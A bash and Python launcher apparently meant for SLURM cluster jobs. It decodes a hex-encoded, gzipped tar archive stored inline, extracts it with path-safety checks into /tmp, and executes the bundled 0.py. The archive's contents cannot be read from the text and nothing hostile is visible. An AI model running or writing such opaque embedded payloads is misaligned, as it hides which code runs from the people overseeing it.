#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed95c18e9b301086f7cc5358b90052e4186220649563ef3db4bd54ab9581217136b191ed7437adfaeeb5215aa5add4dbeeb6ea7c489801cf3fb6c76318dd5bad6e5e14e629191b5bf67bcb96cbe2f9797a5f5615bb21ec65873571b24e181ff23562fd857c9b39fd006ab626b38665d0ae2a51f679ddcce6643688f3418beedeee445e94a10b5ff14a74599ed51c3a0155bfec8a6ad908e879d3f7ab2c675db3aa1bceeb022a2878d3f6bce25dd18abef6492daf559bb303eb458bbccecbbc085f0e425d056b4ace991728cb427051b5655fb1b669b2aca9ca3ae375d72ff34ed479e14d7f952207ce8b2a2b72a87326d8ecfb5b2fee3f00a3c3f9c563fcb9feb32ce3bfd63fe74bacffd7401e076d1cb1673b0f3f82f94ed8dd413673bf28bd3c40d41b7d248370e125b9747eefcdc86c429378472accf6cbe7ec2ebd6d37418386f2b6496216311bff2e714a0df88a77f0e492348dc4e41a2f06a3f7d0ba45ab8fc79392eebcd8efcf7052db385db49fe3f1648aef828cdb7e8d23612df8f09721d2e9a448c4243e1e275e9deee0a9935bb03ed466e3557e3ec5e2bbe851ba1db9cc8fea01542252222c71eb88f4da1020528d06913d51da11a04a1c81868de26cf04e626dda9d30ddfd2e638b385db75a39a94e70ed236d0890a4c44bc694c641759cf72497d221c8ad8d9016c8277138c13b63b449e28fca8a3e0c6238b938f592c3c62fe5102f26c7db21788272f4f8d049934c86dd7c302798c393b4ee5e3f8c56eabb3e1ae9e0b2388efa0418d1ba716030652524242431e4984a1556386173eb4c3206f55fc72d703561bad7cf5be128a48ac22d3169f4d67b1941100441100441100441100441100441100441100441fe577e00d9bbd3cc00280000')
r=Path('/tmp')/('a'+j+'b01ec87a6f29b')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
